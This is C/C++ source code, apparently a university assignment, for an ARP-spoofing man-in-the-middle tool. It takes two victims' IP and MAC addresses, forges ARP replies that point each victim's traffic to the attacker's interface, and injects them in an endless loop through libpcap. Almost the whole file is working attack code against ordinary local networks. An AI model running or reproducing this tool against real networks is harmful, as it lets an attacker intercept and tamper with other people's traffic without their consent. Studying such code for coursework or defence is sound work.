//VUTBR - FIT - PDS project MitM
//Author: Jan Kubis / xkubis13
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <iostream>

#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <linux/if_ether.h> // ETH_P_ARP = 0x0806

using namespace std;

#define UNUSED(x) (void)(x) //suppress w-unused-parameter warnings

#define ETHHDR_LEN 14 // Ethernet header length
#define IP4HDR_LEN 20 // IPv4 header length
#define ARPHDR_LEN 28 // ARP header length

#define ARPPKT_LEN ETHHDR_LEN + ARPHDR_LEN

#define IP4_LEN 4
#define MAC_LEN 6
typedef u_char ipv4_t[IP4_LEN];
typedef u_char mac_t[MAC_LEN];

#define ARP_OP_REQUEST 1   /* ARP Request             */ 
#define ARP_OP_REPLY 2     /* ARP Reply               */ 
typedef struct arphdr { 
    u_int16_t htype;    /* Hardware Type           */ 
    u_int16_t ptype;    /* Protocol Type           */ 
    u_char hlen;        /* Hardware Address Length */ 
    u_char plen;        /* Protocol Address Length */ 
    u_int16_t oper;     /* Operation Code          */ 
    mac_t src_mac;      /* Sender hardware address */ 
    ipv4_t src_ip;      /* Sender IP address       */ 
    mac_t dst_mac;      /* Target hardware address */ 
    ipv4_t dst_ip;      /* Target IP address       */ 
} arphdr_t;
#define MAXBYTES2CAPTURE 2048




typedef struct {
	char* ifName;
	int interval_ms;
	char* protocol;
	ipv4_t vic1_ip;
	mac_t vic1_mac;
	ipv4_t vic2_ip;
	mac_t vic2_mac;
} clargs_t;

typedef struct {
	char* name;
	pcap_t* handle;

	ipv4_t ipv4;
	mac_t mac;
} iface_t;

int parseArgs(int argc, char* argv[], clargs_t *clargs){
	
	if(argc!=15){return 1;}

	int tmp_ip[4];
	unsigned int tmp_mac[6];

	for(int i=1;i<argc;i++){
		if(strcmp(argv[i],"-i")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			clargs->ifName=argv[i];
		}
		else if(strcmp(argv[i],"-t")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			if(!isdigit(*argv[i])){;return 1;} //ms integer
			clargs->interval_ms=strtol(argv[i],NULL,10);
		}
		else if(strcmp(argv[i],"-p")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			if(strcmp(argv[i],"arp")!=0 && strcmp(argv[i],"ndp")!=0){printf("ee");return 1;} // arp || ndp only
			clargs->protocol=argv[i];
		}
		else if(strcmp(argv[i],"-victim1ip")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			sscanf(argv[i], "%d.%d.%d.%d", &tmp_ip[0], &tmp_ip[1], &tmp_ip[2], &tmp_ip[3]);
			for(int x=0;x<IP4_LEN;x++){	clargs->vic1_ip[x] = tmp_ip[x];	} //int[4] to uint8_t[4]
		}
		else if(strcmp(argv[i],"-victim1mac")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			sscanf(argv[i], "%02x%02x.%02x%02x.%02x%02x", &tmp_mac[0], &tmp_mac[1], &tmp_mac[2], &tmp_mac[3], &tmp_mac[4], &tmp_mac[5]);
			for(int x=0;x<MAC_LEN;x++){	clargs->vic1_mac[x] = tmp_mac[x];	} //int[4] to uint8_t[4]
		}
		else if(strcmp(argv[i],"-victim2ip")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			sscanf(argv[i], "%d.%d.%d.%d", &tmp_ip[0], &tmp_ip[1], &tmp_ip[2], &tmp_ip[3]);
			for(int x=0;x<IP4_LEN;x++){	clargs->vic2_ip[x] = tmp_ip[x];	} //int[4] to uint8_t[4]
		}
		else if(strcmp(argv[i],"-victim2mac")==0){
			if(argv[i++]==NULL){return 1;} //move to arg value && check value missing
			//todo: check address
			sscanf(argv[i], "%02x%02x.%02x%02x.%02x%02x", &tmp_mac[0], &tmp_mac[1], &tmp_mac[2], &tmp_mac[3], &tmp_mac[4], &tmp_mac[5]);
			for(int x=0;x<MAC_LEN;x++){	clargs->vic2_mac[x] = tmp_mac[x];	} //int[4] to uint8_t[4]
		}
		else{
			return 1;
		}
	}

	return 0;
}

void mac_print(u_char mac[6]){
	printf("%02X:%02X:%02X:%02X:%02X:%02X", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

void ipv4_print(u_char ip[4]){
	printf("%d.%d.%d.%d", ip[0],ip[1],ip[2],ip[3]);
}


void getifmac(char* ifName, mac_t ifmac) {
	struct ifreq ifr;
	int sock=0;

	sock=socket(AF_INET,SOCK_DGRAM,0);
	strncpy( ifr.ifr_name, ifName, strlen(ifName) );
	ifr.ifr_addr.sa_family = AF_INET;
	if (ioctl( sock, SIOCGIFHWADDR, &ifr ) < 0) {
		return;
	}
	close(sock);

	memcpy(ifmac, ifr.ifr_hwaddr.sa_data, MAC_LEN);
	return ;
}

void getifipv4(char* ifName, ipv4_t ifip4) {
	struct ifreq ifr;
	int sock = 0;

	sock = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, ifName, strlen(ifName));
	ifr.ifr_addr.sa_family = AF_INET;
	if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
		return;
	}
	close(sock);

	memcpy(ifip4, &(((struct sockaddr_in *) &(ifr.ifr_addr))->sin_addr), IP4_LEN);
	return ;
}

uint8_t* arp_pkt_build(ipv4_t src_ip, ipv4_t dst_ip, mac_t src_mac, mac_t dst_mac){
	
	struct ether_header ethhdr;
	memcpy(ethhdr.ether_dhost, dst_mac, MAC_LEN);
	memcpy(ethhdr.ether_shost, src_mac, MAC_LEN);
	ethhdr.ether_type = htons(0x0806);
	
	arphdr_t arphdr;
	arphdr.htype = htons(1);
	arphdr.ptype = htons(0x0800);
	arphdr.hlen = 6;
	arphdr.plen = 4;
	arphdr.oper = htons(ARP_OP_REPLY);
	memcpy(&arphdr.src_mac, src_mac, MAC_LEN);
	memcpy(&arphdr.src_ip, src_ip, IP4_LEN);
	memcpy(&arphdr.dst_mac, dst_mac, MAC_LEN);
	memcpy(&arphdr.dst_ip, dst_ip, IP4_LEN);

	uint8_t* ether_frame= (uint8_t*) malloc(ARPPKT_LEN);
	memcpy(ether_frame,&ethhdr,sizeof(struct ether_header));
	memcpy(ether_frame+ETHHDR_LEN,&arphdr,ARPHDR_LEN*sizeof(uint8_t));

	return ether_frame;
}


void arp_print(arphdr_t *arpheader){
	printf("src MAC: "); mac_print(arpheader->src_mac);printf("\n");
	printf("src IP : "); ipv4_print(arpheader->src_ip);printf("\n");
	printf("dst MAC: "); mac_print(arpheader->dst_mac);printf("\n");
	printf("dst IP : "); ipv4_print(arpheader->dst_ip);printf("\n");
	printf("ptype  : "); printf("%04x\n", ntohs(arpheader->ptype) );
	printf("\n");

	return;
}

void spoof(iface_t iface, clargs_t clargs){
	
	int bytes_written=0;

	while(true){
		uint8_t* pkt1 = arp_pkt_build(clargs.vic2_ip,clargs.vic1_ip,iface.mac,clargs.vic1_mac);
		uint8_t* pkt2 = arp_pkt_build(clargs.vic1_ip,clargs.vic2_ip,iface.mac,clargs.vic2_mac);
		
		arp_print((struct arphdr *)(pkt1+14));
		arp_print((struct arphdr *)(pkt2+14));

		bytes_written =pcap_inject(iface.handle, pkt1, ARPPKT_LEN);
		bytes_written =pcap_inject(iface.handle, pkt2, ARPPKT_LEN);
		printf("%d\n", bytes_written);
		usleep(clargs.interval_ms*1000);
	}

	return;
}

int main(int argc, char* argv[]){
	clargs_t clargs;
	iface_t iface;

	if((parseArgs(argc,argv,&clargs))!=0){
		printf("ARG_ERR\n");
		return 0;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	if ((iface.handle=pcap_create(clargs.ifName,errbuf))==NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", clargs.ifName, errbuf);
		return 0;
	}
	iface.name=clargs.ifName;
	getifmac(iface.name,iface.mac);
	getifipv4(iface.name,iface.ipv4);

	pcap_activate(iface.handle);

	spoof(iface,clargs);

	pcap_close(iface.handle);
}